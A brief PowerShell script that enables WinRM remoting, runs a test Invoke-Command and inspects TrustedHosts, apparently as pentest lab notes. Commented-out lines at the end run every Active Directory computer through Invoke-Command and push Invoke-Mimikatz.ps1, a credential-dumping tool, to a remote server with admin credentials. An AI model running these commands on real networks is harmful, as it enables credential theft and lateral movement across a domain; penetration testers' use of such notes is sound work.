Enable-PSRemoting –force

Invoke-Command -Uri "http://127.0.0.0" -ScriptBlock { Get-ChildItem "C:\Program Files" }
<#
# Set start mode to automatic
Set-Service WinRM -StartMode Automatic

# Verify start mode and state - it should be running
Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
#>

# Trust all hosts
#Set-Item WSMan:localhost\client\trustedhosts -value 127.0.0.0

# Verify trusted hosts configuration
Get-Item WSMan:\localhost\Client\TrustedHosts


#Get-ADComputer -Filter *  -properties name | select @{Name="computername";Expression={$_."name"}} | Invoke-Command -ScriptBlock {hostname}

#Invoke-Command -ComputerName MyServer1 -FilePath C:\pentest\Invoke-Mimikatz.ps1
#Invoke-Command -ComputerName MyServer1 -FilePath C:\pentest\Invoke-Mimikatz.ps1 -Credential demo\serveradmin
